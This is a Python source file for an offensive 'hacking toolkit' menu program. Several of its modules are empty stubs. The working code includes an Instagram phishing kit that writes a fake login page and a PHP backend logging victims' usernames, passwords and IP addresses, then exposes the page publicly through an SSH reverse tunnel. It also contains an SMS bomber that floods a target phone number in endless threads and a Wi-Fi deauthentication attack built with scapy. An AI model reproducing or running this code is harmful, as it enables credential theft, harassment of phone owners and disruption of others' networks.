import os
import time
import platform
import shutil
import subprocess
import socket
import re
import threading
import json
import urllib.request

# --- SMS Motoru Entegrasyonu ---
try:
    from sms import SendSms
    servisler_sms = []
    for attribute in dir(SendSms):
        attribute_value = getattr(SendSms, attribute)
        if callable(attribute_value) and not attribute.startswith('__'):
            servisler_sms.append(attribute)
except ImportError:
    servisler_sms = []

# Renk Tanımlamaları
LINUX_YESIL = "\033[92m"
LINUX_SARI = "\033[1;33m"
LINUX_KIRMIZI = "\033[91m"
RESET = "\033[0m"

root_varmi = os.getuid() if hasattr(os, 'getuid') else 1
isletim_sistemi = platform.system()
yer = "ana_menu"

def kendi_sistem_ekranin():
    os.system("clear")
    print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n
    """)
    print(f" [+] System detection in progress: {platform.system()}")
    time.sleep(1)
    print(f" [+] Processor architecture: {platform.machine()}")
    time.sleep(1)
    print(f" [+] User permission: {f'{LINUX_YESIL}ROOT / Full Access' if root_varmi == 0 else f'{LINUX_KIRMIZI}Low Access'}{LINUX_YESIL}")
    time.sleep(1)

def menu(OS):
    global yer
    while True:
        # ==========================================
        # 1. ANA MENÜ
        # ==========================================
        if yer == "ana_menu":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n
            """)
            
            if root_varmi != 0:
                print(f"{LINUX_SARI}NOTE: For more options (like Wireless), log in using Root (sudo)\n{LINUX_YESIL}")
            else:
                print(f"{LINUX_KIRMIZI}[🔥] ROOT MODE ACTIVE - All advanced options unlocked.\n{LINUX_YESIL}")

            print("Select the action you want to perform\n\n1. Brutal Force\n2. Phishing\n3. OSINT\n4. DDOS Attack\n5. ARP Spoofing\n6. IP Tracer\n7. SMS Bomber")
            
            if root_varmi == 0:
                print("8. Wireless (Wifi Hack)")
                
            print("\n0. Exit\n")
            
            try:
                secim = int(input(":"))
                match secim:
                    case 0: 
                        os.system("clear")
                        return 0
                    case 1: yer = "brutal_force"
                    case 2: yer = "phishing"
                    case 3: yer = "osint"
                    case 4: yer = "ddos"
                    case 5: yer = "arp"
                    case 6: yer = "tracer"
                    case 7: yer = "sms_bomber"
                    case 8:
                        if root_varmi == 0: yer = "wifihack"
                        else:
                            print(f"{LINUX_KIRMIZI}[!] This module requires ROOT privileges (sudo)!")
                            time.sleep(2)
                    case _: 
                        print("Please enter only the numbers listed in the options...")
                        time.sleep(2)
            except: pass
            continue

        # ==========================================
        # 2. BRUTAL FORCE (KODLAR AYNEN KORUNDU)
        # ==========================================
        elif yer == "brutal_force":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- BRUTAL FORCE MODULE --- \n")
            print("Select the action you want to perform\n\n1. SSH Brutal Force\n2. FTP Brutal Force\n0. Back\n\n")
            try:
                secim = int(input(":"))
                match secim:
                    case 0: yer = "ana_menu"
                    case 1: yer = "brutal_force_ssh"
                    case 2: yer = "brutal_force_ftp"
                    case _: 
                        print("Please enter only the numbers listed in the options...")
                        time.sleep(2)

            except: pass
            continue

        elif yer == "brutal_force_ssh":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- SSH BRUTAL FORCE --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Brutal Force Menu...")
            yer = "brutal_force"
            continue

        elif yer == "brutal_force_ftp":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- FTP BRUTAL FORCE --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Brutal Force Menu...")
            yer = "brutal_force"
            continue

        # ==========================================
        # 3. PHISHING
        # ==========================================
        elif yer == "phishing":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- PHISHING MODULE --- \n")
            print("Select the action you want to perform\n\n1. instagram\n2. facebook\n3. twitter\n4. steam\n5. spotify\n6. X\n\n0. Back\n")
            try:
                secim = int(input(":"))
                match secim:
                    case 0: yer = "ana_menu"
                    case _ if 1 <= secim <= 6: yer = f"phishing_{secim}"
                    case _: 
                        print("Please enter only the numbers listed in the options...")
                        time.sleep(2)
            except ValueError:
                print("Please enter a valid number...")
                time.sleep(2)
            continue

        elif yer == "phishing_1":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- INSTAGRAM PHISHING --- \n")
            os.system("fuser -k 8080/tcp > /dev/null 2>&1")
            site_dizini = "sites/instagram"
            if not os.path.exists(site_dizini):
                os.makedirs(site_dizini, exist_ok=True)
            
            php_backend = """<?php
            function preg_index($pattern, $subject) { return preg_match($pattern, $subject); }
            function dual_ip_coz() {
                $ipv4 = "Not Detected"; $ipv6 = "Not Detected"; $ip_bloklari = '';
                $alanlar = ['HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
                foreach ($alanlar as $alan) { if (isset($_SERVER[$alan])) { $ip_bloklari .= ',' . $_SERVER[$alan]; } }
                $parcalar = explode(',', $ip_bloklari);
                foreach ($parcalar as $p) {
                    $p = trim($p);
                    if (filter_var($p, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false) { $ipv4 = $p; }
                    elseif (filter_var($p, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false) { $ipv6 = $p; }
                }
                return ['v4' => $ipv4, 'v6' => $ipv6];
            }
            if (isset($_POST['on_sizi']) && $_POST['on_sizi'] == 'true') {
                $tarih = date('Y-m-d H:i:s'); $ips = dual_ip_coz();
                $log = "[🔥] DEVICE DATA RECORDED!\\nZaman: $tarih\\nIPv4: " . $ips['v4'] . "\\n\\n";
                file_put_contents('kayitlar.txt', $log, FILE_APPEND); echo json_encode(["status" => "ok"]); exit();
            }
            if (isset($_POST['username']) && isset($_POST['password'])) {
                $log = "[🔑] CREDENTIALS!\\nUser: ".$_POST['username']."\\nPass: ".$_POST['password']."\\n\\n";
                file_put_contents('kayitlar.txt', $log, FILE_APPEND); header('Location: https://www.instagram.com'); exit();
            }
            ?>"""
            with open(f"{site_dizini}/login.php", "w", encoding="utf-8") as f: f.write(php_backend)
            
            html_frontend = """<!DOCTYPE html><html><head><title>Instagram</title></head><body><form method="POST" action="login.php"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></body></html>"""
            with open(f"{site_dizini}/index.html", "w", encoding="utf-8") as f: f.write(html_frontend)
            
            kayitlar_logu = f"{site_dizini}/kayitlar.txt"
            with open(kayitlar_logu, "w", encoding="utf-8") as f: f.write("")

            print(f"{LINUX_YESIL}[*] The PHP local server is running on Port 8080...")
            php_proc = subprocess.Popen(["php", "-S", "0.0.0.0:8080", "-t", site_dizini], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

            ssh_proc = subprocess.Popen(["ssh", "-R", "80:localhost:8080", "nokey@localhost.run"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL, text=True)
            tünel_linki = "Bağlantı Kurulamadı"
            baslangic = time.time()
            while time.time() - baslangic < 10:
                satir = ssh_proc.stdout.readline()
                link_bulundu = re.search(r'https?://[a-zA-Z0-9.-]+\.lhr\.life', satir)
                if link_bulundu:
                    tünel_linki = link_bulundu.group(0)
                    break

            print(f"{LINUX_SARI}[🔥] AUTOMATIC WAN   : {tünel_linki}")
            print(f"\n{LINUX_YESIL}[*] Listening mode active. Press CTRL + C to exit.\n")

            try:
                son_pozisyon = 0
                while True:
                    if os.path.exists(kayitlar_logu):
                        with open(kayitlar_logu, "r", encoding="utf-8") as log_f:
                            log_f.seek(son_pozisyon)
                            ham_metin = log_f.read()
                            son_pozisyon = log_f.tell()
                            if ham_metin: print(ham_metin)
                    time.sleep(0.5)
            except KeyboardInterrupt:
                ssh_proc.terminate()
                php_proc.terminate()
                yer = "phishing"
            continue

        elif yer == "phishing_2":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- FACEBOOK PHISHING --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Phishing Menu...")
            yer = "phishing"
            continue

        elif yer == "phishing_3":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- TWITTER PHISHING --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Phishing Menu...")
            yer = "phishing"
            continue

        elif yer == "phishing_4":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- STEAM PHISHING --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Phishing Menu...")
            yer = "phishing"
            continue

        elif yer == "phishing_5":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- SPOTIFY PHISHING --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Phishing Menu...")
            yer = "phishing"
            continue

        elif yer == "phishing_6":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- X PHISHING --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Phishing Menu...")
            yer = "phishing"
            continue

        # ==========================================
        # 4. OSINT
        # ==========================================
        elif yer == "osint":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- OSINT MODULE --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Main Menu...")
            yer = "ana_menu"
            continue

        # ==========================================
        # 5. DDOS ATTACK
        # ==========================================
        elif yer == "ddos":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- DDOS ATTACK MODULE --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Main Menu...")
            yer = "ana_menu"
            continue

        # ==========================================
        # 6. ARP SPOOFING
        # ==========================================
        elif yer == "arp":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- ARP SPOOFING MODULE --- \n")
            print(f"{LINUX_SARI}[*] Bu modülün içi şu an boş ve kodlanmaya hazır.")
            input("\nPress ENTER to return to Main Menu...")
            yer = "ana_menu"
            continue

        # ==========================================
        # 7. IP TRACER
        # ==========================================
        elif yer == "tracer":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- IP TRACER MODULE --- \n")
            print("0. Back to Main Menu\n")
            target_ip = input("Target IP Address (e.g., 8.8.8.8) : ").strip()
            if target_ip == "0" or target_ip == "":
                yer = "ana_menu"
                continue
            
            try:
                url = f"http://ip-api.com/json/{target_ip}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting"
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=10) as response:
                    data = json.loads(response.read().decode())

                if data.get("status") == "success":
                    print(f"{LINUX_YESIL}[+] IP Address    : {data.get('query')}")
                    print(f"[+] Country       : {data.get('country')} ({data.get('countryCode')})")
                    print(f"[+] Region        : {data.get('regionName')}")
                    print(f"[+] City          : {data.get('city')}")
                    print(f"[+] Coordinates   : {data.get('lat')}, {data.get('lon')}")
                    print(f"[+] ISP           : {data.get('isp')}")
                    print(f"[+] Proxy/VPN?    : {'Yes' if data.get('proxy') else 'No'}{RESET}")
                else:
                    print(f"{LINUX_KIRMIZI}[-] Error: {data.get('message')}")
            except Exception:
                print(f"{LINUX_KIRMIZI}[-] Connection Error.")
            input("\nPress ENTER to return to Main Menu...")
            yer = "ana_menu"
            continue

        # ==========================================
        # 8. SMS BOMBER
        # ==========================================
        elif yer == "sms_bomber":
            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- SMS BOMBER (TURBO) --- \n")
            phone = input("Target Phone (e.g., 5xxxxxxxxx) : ").strip()
            if phone == "0" or phone == "":
                yer = "ana_menu"
                continue
            mail = input("Mail Address : ").strip()
            try:
                send_sms = SendSms(phone, mail)
                dur = threading.Event()
                def Turbo():
                    while not dur.is_set():
                        threads = []
                        for fonk in servisler_sms:
                            t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                            threads.append(t)
                            t.start()
                        for t in threads: t.join()
                ana_saldiri_thread = threading.Thread(target=Turbo, daemon=True)
                ana_saldiri_thread.start()
                while ana_saldiri_thread.is_alive():
                    time.sleep(0.5)
            except KeyboardInterrupt:
                dur.set()
            yer = "ana_menu"
            continue

        elif yer == "wifihack":
            mon_detected = False
            for i in os.listdir('/sys/class/net/'):
                if "mon" in i: mon_detected = True
            
            if not mon_detected:
                os.system("clear")
                print(f"{LINUX_KIRMIZI}[!] WARNING: Monitor mode is mandatory for Wireless Module!{RESET}\n")
                print(f"Available interfaces: {os.listdir('/sys/class/net/')}")
                card = input(f"{LINUX_SARI}Enter physical interface to enable monitor mode (e.g., wlan0)(enter: back to main menu): {RESET}")
                if not card: yer = "ana_menu"; continue
                print(f"{LINUX_YESIL}[*] Enabling monitor mode...{RESET}")
                os.system(f"sudo airmon-ng start {card}")
                time.sleep(3)
                continue # Loop restarts to re-verify monitor mode

            os.system("clear")
            print(f"""{LINUX_YESIL}
                     █████╗ ██╗  ██╗████████╗
                    ██╔══██╗██║  ██║╚══██╔══╝
                    ███████║███████║   ██║   
                    ██╔══██║██╔══██║   ██║   
                    ██║  ██║██║  ██║   ██║   
                    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                    version 1.0b - Alperen Buba\n\n\n
            """)
            print(f"{LINUX_YESIL}--- WIRELESS MODULE --- \n\n1. Scan Networks (Airodump-ng)\n2. Deauth Attack (Disconnect Client)\n\n0. Back to Main Menu\n")
            try:
                secim = int(input(":"))
                if secim == 0: yer = "ana_menu"
                elif secim == 1: yer = "wifihack_scan"
                elif secim == 2: yer = "wifihack_deauth"
                else: print("Invalid choice."); time.sleep(1)
            except ValueError: print("Please enter a valid number."); time.sleep(1)
            continue

        elif yer == "wifihack_scan":
            os.system("clear")
            print(f"{LINUX_YESIL}--- WIRELESS SCAN MODULE --- \n")
            
            # Get interface
            kart = ""
            for i in os.listdir('/sys/class/net/'):
                if "mon" in i: kart = i
            
            print(f"{LINUX_YESIL}[*] Automatically detected monitor interface: {LINUX_SARI}{kart}")
            print(f"{LINUX_YESIL}[*] Starting airodump-ng... Press CTRL+C to stop.\n")
            time.sleep(2)
            os.system(f"sudo airodump-ng {kart}")
            yer = "wifihack"
            continue

        elif yer == "wifihack_deauth":
            os.system("clear")
            print(f"{LINUX_YESIL}--- WIRELESS DEAUTH MODULE --- \n")
            
            kart = ""
            for i in os.listdir('/sys/class/net/'):
                if "mon" in i: kart = i
                
            bssid = input("Target AP BSSID: ").strip()
            target_mac = input("Target Client MAC (FF:FF:FF:FF:FF:FF for all): ").strip()
            
            try:
                from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
                pkt = RadioTap()/Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                print(f"{LINUX_YESIL}[+] Deauth packet configured. Injecting packets...")
                
                while True:
                    sendp(pkt, iface=kart, count=1, verbose=False)
                    print(f"\r{LINUX_KIRMIZI}[🔥] Deauth packet sent to {target_mac}...", end="")
                    time.sleep(0.1)
            except KeyboardInterrupt: 
                print(f"\n{LINUX_YESIL}[*] Returning to Wireless Menu...")
                yer = "wifihack"
            except Exception as e:
                print(f"\n{LINUX_KIRMIZI}[!] Error: {e}")
                input("Press ENTER to return...")
                yer = "wifihack"
            continue

if __name__ == "__main__":
    kendi_sistem_ekranin()
    menu(isletim_sistemi)